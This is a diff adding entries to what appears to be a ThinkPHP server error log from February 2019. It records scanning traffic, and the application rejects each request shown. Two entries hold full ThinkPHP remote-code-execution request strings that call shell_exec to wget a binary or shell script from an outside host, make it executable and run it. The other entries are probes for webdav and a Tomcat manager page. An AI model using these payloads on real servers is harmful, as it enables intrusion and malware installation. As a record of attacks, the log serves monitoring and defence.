@@ -1,0 +1,12 @@
+[ 2019-02-10T02:41:53+08:00 ] 185.172.110.88 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://185.244.25.148/miori.x86;%20chmod%20777%20miori.x86;./miori.x86%20thinkphp
+ERR: 非法操作:\think\app
+
+[ 2019-02-10T08:01:26+08:00 ] 185.244.25.128 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.ga/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20
+ERR: 非法操作:\think\app
+
+[ 2019-02-10T23:00:49+08:00 ] 42.7.26.95 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2019-02-10T23:00:56+08:00 ] 42.7.26.95 /manager/html
+ERR: 无法加载控制器:Manager
+
